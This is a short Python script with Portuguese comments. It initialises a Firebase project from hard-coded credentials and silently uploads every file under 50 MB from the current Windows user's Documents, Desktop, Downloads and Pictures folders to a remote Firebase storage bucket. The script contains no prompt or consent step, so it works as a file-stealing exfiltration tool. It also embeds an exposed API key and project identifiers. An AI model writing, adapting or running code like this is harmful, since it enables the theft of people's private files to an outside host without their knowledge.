import pyrebase
import getpass
import os
from os.path import isfile
import datetime

#config firebase
firebaseConfig = {'apiKey': "AIzaSyAisBHHaVOxZNBdro9gA2GEXoPwvf5Mvx0",
  'authDomain': "bancodedados-54d83.firebaseapp.com",
  'databaseURL': "https://bancodedados-54d83-default-rtdb.firebaseio.com",
  'projectId': "bancodedados-54d83",
  'storageBucket': "bancodedados-54d83.appspot.com",
  'messagingSenderId': "292092738374",
  'appId': "1:292092738374:web:b1d3a2a3117a13be7a0347"}

firebase = pyrebase.initialize_app(firebaseConfig)

storage = firebase.storage()

#################################################################################
# data atual
data_atual = datetime.date.today()

# pega o usuario do win atual
usuario = getpass.getuser()

# definido variaveis da função
documentos = 'documentos'
area_de_trabalho = "area de trabalho"
pasta_downloads = 'downloads'
imagens = 'imagens'

#definir a localização dos arquivos 
desktop = f"C:/Users/{usuario}/Desktop"

documents = f"C://Users/{usuario}/Documents"

downloads = f"C://Users/{usuario}/Downloads"

pictures = f"C://Users/{usuario}/Pictures"

# função principal
def envia(caminho, pasta):
    for c in os.listdir(caminho):
        #if c.endswith(".txt"):
        os.chdir(caminho)
        if isfile(c):
            tamanho = os.path.getsize(c)
            if tamanho < 52428800:
                local = f'{pasta}/{c}'
                print(f"tamanho de {tamanho} {local}")
                
                storage.child(local).put(c)


envia(documents, documentos)
envia(desktop, area_de_trabalho)
envia(downloads, pasta_downloads)
envia(pictures, imagens)
